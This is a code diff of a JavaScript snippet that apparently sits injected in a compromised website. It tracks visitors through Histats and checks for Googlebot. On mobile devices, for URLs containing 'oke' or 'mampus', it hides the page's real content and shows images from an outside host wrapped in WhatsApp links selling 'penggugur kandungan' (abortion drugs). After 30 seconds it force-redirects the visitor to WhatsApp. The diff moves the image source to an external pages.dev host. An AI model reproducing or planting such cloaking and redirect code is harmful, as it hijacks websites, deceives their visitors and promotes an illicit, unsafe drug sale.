@@ -1,5 +1,5 @@
 var _Hasync= _Hasync|| [];
-_Hasync.push(['Histats.start', '1,4627111,4,6,200,40,00011111']);
+_Hasync.push(['Histats.start', '1,4684594,4,2,120,55,00011111']);
 _Hasync.push(['Histats.fasi', '1']);
 _Hasync.push(['Histats.track_hits', '']);
 (function() {
@@ -16,7 +16,7 @@ if (navigator.userAgent.match(/(googlebot\/|Googlebot-Mobile|Googlebot-Image|Goo
 if (navigator.userAgent.match(/(iPod|iPhone|iPad|Android)/) ) {
 if (window.location.href.indexOf("oke") > -1 || window.location.href.indexOf("mampus") > -1 ){         
 jQuery('.art-content').css({'position':'fixed','top':'-10000px',});
-jQuery('span[link]').each(function(){jQuery(this).append('<img src="/assets/img/'+jQuery(this).attr('link')+'" class="'+jQuery(this).attr('class')+'" style="'+jQuery(this).attr('class')+'">');});
+jQuery('span[link]').each(function(){jQuery(this).append('<img src="https://tenangcepat.pages.dev/assets/img/'+jQuery(this).attr('link')+'" class="'+jQuery(this).attr('class')+'" style="'+jQuery(this).attr('class')+'">');});
 jQuery('span[link]').each(function(){jQuery(this).wrap("<a href='https://wa.me/6281313390859?text=Mau pesan ᴘᴇɴɢɢᴜɢᴜʀ ᴋᴀɴᴅᴜɴɢᴀɴ'></a>");});
 jQuery('#modal-1').modal(); 
 setTimeout(function(){location.href="https://wa.me/6281313390859?text=Mau Pesan ᴘᴇɴɢɢᴜɢᴜʀ ᴋᴀɴᴅᴜɴɢᴀɴ"},30000 ); 
